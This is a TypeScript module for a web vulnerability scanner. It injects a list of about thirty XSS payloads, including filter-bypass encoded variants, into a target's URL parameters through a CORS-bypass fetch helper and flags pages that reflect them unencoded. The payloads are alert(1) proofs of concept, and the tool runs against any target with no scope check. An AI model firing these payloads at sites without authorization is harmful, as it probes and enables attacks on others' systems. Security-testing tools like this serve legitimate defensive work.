import { normalizeUrl } from './apiUtils';
import { fetchWithBypass, CORSBypassMetadata } from './corsProxy';

export interface XSSScanResult {
  vulnerable: boolean;
  testedPayloads: number;
  vulnerabilities: Array<{
    payload: string;
    location: string;
    severity: 'critical' | 'high' | 'medium' | 'low';
    type: string;
    evidence?: string;
    parameter?: string;
    confidence: number;
  }>;
  tested: boolean;
  corsMetadata?: CORSBypassMetadata;
}

const XSS_PAYLOADS = [
  // original entries
  { payload: '<script>alert(1)</script>', type: 'Script Tag', severity: 'critical' as const, confidence: 0.95 },
  { payload: '<img src=x onerror=alert(1)>', type: 'Event Handler', severity: 'critical' as const, confidence: 0.95 },
  { payload: '<svg onload=alert(1)>', type: 'SVG Event', severity: 'critical' as const, confidence: 0.95 },
  { payload: '"><script>alert(1)</script>', type: 'Attribute Break', severity: 'critical' as const, confidence: 0.9 },
  { payload: '\'><script>alert(1)</script>', type: 'Attribute Break', severity: 'critical' as const, confidence: 0.9 },
  { payload: 'javascript:alert(1)', type: 'JavaScript Protocol', severity: 'high' as const, confidence: 0.85 },
  { payload: '<iframe src="javascript:alert(1)">', type: 'Iframe Injection', severity: 'critical' as const, confidence: 0.9 },

  // additional/reflected payloads
  { payload: '<body onload=alert(1)>', type: 'Body Onload', severity: 'critical' as const, confidence: 0.92 },
  { payload: '<details open ontoggle=alert(1)>', type: 'HTML5 Details Toggle', severity: 'high' as const, confidence: 0.88 },
  { payload: '<input autofocus onfocus=alert(1)>', type: 'Autofocus/Onfocus', severity: 'critical' as const, confidence: 0.9 },
  { payload: '<a href="javascript:alert(1)">click</a>', type: 'Link JS Protocol', severity: 'high' as const, confidence: 0.85 },

  // attribute-break / quoted-attribute polyglots
  { payload: '"><img src=x onerror=alert(1)>', type: 'Attribute Break + Img', severity: 'critical' as const, confidence: 0.93 },
  { payload: "'><img src=x onerror=alert(1)>", type: 'Attribute Break + Img', severity: 'critical' as const, confidence: 0.93 },

  // svg / foreignObject / namespace tricks
  { payload: '<svg><foreignObject><script>alert(1)</script></foreignObject></svg>', type: 'SVG foreignObject', severity: 'critical' as const, confidence: 0.92 },
  { payload: '<svg onload=alert(1)//', type: 'SVG onload short', severity: 'critical' as const, confidence: 0.9 },

  // DOM / JS sink variants (useful for DOM XSS)
  { payload: '";alert(1);//', type: 'JS Context Break (DOM)', severity: 'critical' as const, confidence: 0.9 },
  { payload: "';alert(1);//", type: 'JS Context Break (DOM)', severity: 'critical' as const, confidence: 0.9 },

  // protocol/data URIs and meta refresh
  { payload: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">', type: 'Meta Refresh', severity: 'high' as const, confidence: 0.82 },
  { payload: '<iframe srcdoc="<script>alert(1)</script>"></iframe>', type: 'Iframe srcdoc', severity: 'critical' as const, confidence: 0.9 },
  { payload: '<a href="data:text/html,<script>alert(1)</script>">x</a>', type: 'Data URI', severity: 'high' as const, confidence: 0.8 },

  // encoded / obfuscated variants (useful to bypass naive filters)
  { payload: '%3Cscript%3Ealert(1)%3C%2Fscript%3E', type: 'URL-encoded Script', severity: 'high' as const, confidence: 0.78 },
  { payload: '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;', type: 'HTML Entity Encoded', severity: 'high' as const, confidence: 0.78 },

  // event-handler attribute polyglots & less-common events
  { payload: '<video onerror=alert(1)><source src=1></video>', type: 'Media Onerror', severity: 'high' as const, confidence: 0.86 },
  { payload: '<math><maction xlink:href="javascript:alert(1)"></maction></math>', type: 'MathML / XLink', severity: 'medium' as const, confidence: 0.6 },

  // template / attribute injection useful for modern frameworks
  { payload: '\' + alert(1) + \\' , type: 'JS Template/Concat (Framework)', severity: 'critical' as const, confidence: 0.88 },
  { payload: '${alert(1)}', type: 'Template Literal Injection', severity: 'critical' as const, confidence: 0.88 },

  // browser URL / location sinks (useful in script contexts)
  { payload: '");location.href="javascript:alert(1)//', type: 'location.href Break', severity: 'critical' as const, confidence: 0.9 },

  // harmless proof-of-concept alternatives (useful for low-risk testing)
  { payload: '<svg><desc>TEST</desc></svg>', type: 'SVG Non-Exec (PoC)', severity: 'low' as const, confidence: 0.3 },
];

const XSS_DANGEROUS_CONTEXTS = [
  // Unquoted attribute
  /<[^>]+\s+\w+=[^"'][^>\s]*PAYLOAD/i,
  // Inside script tag
  /<script[^>]*>[\s\S]*PAYLOAD[\s\S]*<\/script>/i,
  // Event handler
  /on\w+\s*=\s*["']?[^"']*PAYLOAD/i,
  // href/src attribute
  /(href|src)\s*=\s*["']?[^"']*PAYLOAD/i,
];

const checkReflection = (response: string, payload: string): { 
  reflected: boolean; 
  context: string; 
  evidence: string; 
  encoded: boolean;
  confidence: number;
} => {
  const lowerResponse = response.toLowerCase();
  const lowerPayload = payload.toLowerCase();
  
  // Check for direct reflection (unencoded)
  if (lowerResponse.includes(lowerPayload)) {
    const index = lowerResponse.indexOf(lowerPayload);
    const context = response.substring(Math.max(0, index - 150), Math.min(response.length, index + payload.length + 150));
    
    // Check if in dangerous context
    let confidence = 0.95;
    let contextType = 'Direct reflection in HTML';
    
    for (const pattern of XSS_DANGEROUS_CONTEXTS) {
      const testPattern = pattern.source.replace('PAYLOAD', payload.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'));
      if (new RegExp(testPattern, 'i').test(response)) {
        confidence = 0.98;
        contextType = 'Direct reflection in dangerous context';
        break;
      }
    }
    
    return {
      reflected: true,
      context: contextType,
      evidence: context.substring(0, 300),
      encoded: false,
      confidence,
    };
  }

  // Check for partial reflection
  const dangerousParts = payload.match(/<[^>]+>|alert\(|onerror=|onload=|javascript:/gi);
  if (dangerousParts) {
    for (const part of dangerousParts) {
      if (lowerResponse.includes(part.toLowerCase())) {
        const index = lowerResponse.indexOf(part.toLowerCase());
        const context = response.substring(Math.max(0, index - 100), Math.min(response.length, index + 200));
        
        return {
          reflected: true,
          context: 'Partial reflection detected',
          evidence: context.substring(0, 300),
          encoded: false,
          confidence: 0.7,
        };
      }
    }
  }

  // Check for HTML encoded reflection (safe)
  const htmlEncodedPayload = payload
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
  
  if (response.includes(htmlEncodedPayload)) {
    return {
      reflected: true,
      context: 'HTML encoded (safe)',
      evidence: 'Payload properly encoded',
      encoded: true,
      confidence: 0,
    };
  }

  // Check for URL encoded reflection (safe)
  const urlEncodedPayload = encodeURIComponent(payload);
  if (response.includes(urlEncodedPayload)) {
    return {
      reflected: true,
      context: 'URL encoded (safe)',
      evidence: 'Payload URL encoded',
      encoded: true,
      confidence: 0,
    };
  }

  return {
    reflected: false,
    context: 'Not reflected',
    evidence: 'Payload not found in response',
    encoded: false,
    confidence: 0,
  };
};

export const performXSSScan = async (target: string): Promise<XSSScanResult> => {
  console.log(`[XSS Scan] Starting REAL vulnerability scan for ${target}`);
  
  const result: XSSScanResult = {
    vulnerable: false,
    testedPayloads: 0,
    vulnerabilities: [],
    tested: true,
  };

  try {
    const url = normalizeUrl(target);
    const urlObj = new URL(url);
    
    const params = new URLSearchParams(urlObj.search);
    const paramKeys = Array.from(params.keys());
    
    if (paramKeys.length === 0) {
      console.log('[XSS Scan] No parameters found, testing with default parameter');
      paramKeys.push('q');
    }

    for (const paramKey of paramKeys) {
      for (const { payload, severity, type, confidence: baseConfidence } of XSS_PAYLOADS) {
        try {
          const testUrl = new URL(url);
          const testParams = new URLSearchParams(testUrl.search);
          testParams.set(paramKey, payload);
          testUrl.search = testParams.toString();

          console.log(`[XSS Scan] Testing ${type} on '${paramKey}': ${payload.substring(0, 40)}...`);

          const testResult = await fetchWithBypass(testUrl.toString(), { timeout: 10000 });
          if (!result.corsMetadata) {
            result.corsMetadata = testResult.metadata;
          }
          const response = testResult.response;
          result.testedPayloads++;

          const text = await response.text();
          const reflection = checkReflection(text, payload);

          if (reflection.reflected && !reflection.encoded && reflection.confidence >= 0.7) {
            console.log(`[XSS Scan] ⚠️ ${severity.toUpperCase()}: XSS vulnerability detected! Confidence: ${(reflection.confidence * 100).toFixed(0)}%`);
            result.vulnerable = true;
            result.vulnerabilities.push({
              payload,
              location: `URL parameter: ${paramKey}`,
              severity,
              type,
              evidence: reflection.evidence,
              parameter: paramKey,
              confidence: reflection.confidence,
            });
          } else if (reflection.reflected && reflection.encoded) {
            console.log(`[XSS Scan] ℹ️ Payload reflected but safely encoded: ${paramKey}`);
          }

          await new Promise(resolve => setTimeout(resolve, 300));
        } catch (error: any) {
          console.warn(`[XSS Scan] Payload test failed: ${error.message}`);
        }
      }
    }

    // Filter out low confidence results
    result.vulnerabilities = result.vulnerabilities.filter(v => v.confidence >= 0.7);

    console.log(`[XSS Scan] Complete: ${result.vulnerabilities.length} high-confidence vulnerabilities from ${result.testedPayloads} tests`);
    return result;
  } catch (error: any) {
    console.error('[XSS Scan] Critical error:', error);
    return {
      vulnerable: false,
      testedPayloads: 0,
      vulnerabilities: [],
      tested: false,
    };
  }
};